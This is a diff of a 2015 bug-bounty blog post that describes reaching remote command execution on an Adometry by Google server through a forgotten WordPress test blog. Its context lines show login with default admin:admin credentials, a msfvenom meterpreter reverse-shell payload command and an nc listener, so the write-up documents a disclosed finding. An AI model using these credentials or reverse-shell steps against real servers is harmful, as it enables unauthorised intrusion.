@@ -22,8 +22,8 @@
     <meta property="og:image" content="https://r0rshark.github.io/images/logo.jpg"/>
     
     
-    <meta property="og:description" content="Forgotten Wordpress blog could be exploited to get Remote command execution on Adometry by Google "/>
-    <meta name="description" content="Forgotten Wordpress blog could be exploited to get Remote command execution on Adometry by Google "/>
+    <meta property="og:description" content="Forgotten Wordpress blog could be exploited to get remote command execution on Adometry by Google server "/>
+    <meta name="description" content="Forgotten Wordpress blog could be exploited to get remote command execution on Adometry by Google server "/>
     
     <meta property="og:site_name" content="r0rshark Blog">
 </head>
@@ -73,7 +73,8 @@ Since the bugs are often located in hidden and old pages of the website let’s 
 </div>
 
 <h3 id="the-wordpress-test-blog">The Wordpress test blog</h3>
-<p>The first thing that I have noticed was the title of the blog  <strong>Test | Just another WordPress site - Adometry</strong> which contains the magic keyword that every Penetration Tester/Bug Hunter is looking for: <strong>Test</strong> that in many case means vulnerable as hell. The second thing that I have noticed is that the url of this blog <a href="http://www.adometry.com/blog2013/">http://www.adometry.com/blog2013/</a> is different from the official one that I have discovered before. By inspecting the source code of the page I discovered that the <strong>Wordpress version was the 3.5.1</strong> that has a lot of vulnerabilities like XSS XXE CSRF and maybe a <a href="https://vagosec.org/2013/12/wordpress-rce-exploit/">RCE</a>, but  I am a lazy guy, out there it was very hot, and I would like to go for a swim so I tryed to find an easier way in. I know for sure this was just a testing blog and so what are the <strong>classical credetials</strong> for a testing thing? The default ones and in the case of Wordpress the classical <strong>admin:admin</strong>. Let’s give them a shot and here we are:</p>
+<p>The first thing that I have noticed was the title of the blog  <strong>Test | Just another WordPress site - Adometry</strong> which contains the magic keyword that every Penetration Tester/Bug Hunter is looking for: <strong>Test</strong> that in many cases means vulnerable as hell. The second thing that I have noticed is that the url of this blog <a href="http://www.adometry.com/blog2013/">http://www.adometry.com/blog2013/</a> is different from the official one that I have discovered before. By inspecting the source code of the page I discovered that the <strong>Wordpress version was the 3.5.1</strong> that has a lot of vulnerabilities like XSS XXE CSRF and maybe a <a href="https://vagosec.org/2013/12/wordpress-rce-exploit/">RCE</a>, but  I am a lazy guy, out there it was very hot, and I would like to go for a swim so I tryed to find an easier way in. I know for sure this was just a testing blog and so what are the <strong>classical credetials</strong> for a testing thing? The default ones and in the case of Wordpress the classical <strong>admin:admin</strong>. Let’s give them a shot and here we are:</p>
+
 <div class="full zoomable">
   <img src="/images/google/wordpress.png" />
 </div>
@@ -113,6 +114,7 @@ msfvenom -p php/meterpreter_reverse_tcp LHOST=Your IP LPORT=Your Port -f raw &gt
 <ul>
   <li><strong>Upload and enable the plugin</strong> in the Wordpress dashboard</li>
 </ul>
+
 <div class="full zoomable">
   <img src="/images/google/wordpress_plugin.png" />
 </div>
@@ -146,7 +148,7 @@ nc -lvp port
             
 <div class="social">
     
-    <div class="fb-share-button" data-href="https://r0rshark.github.io/2015/07/30/google/" data-layout="button_count"></div>
+    <div class="fb-share-button" data-href="https://r0rshark.github.io/2015/07/30/google" data-layout="button_count"></div>
     
     
     <div>
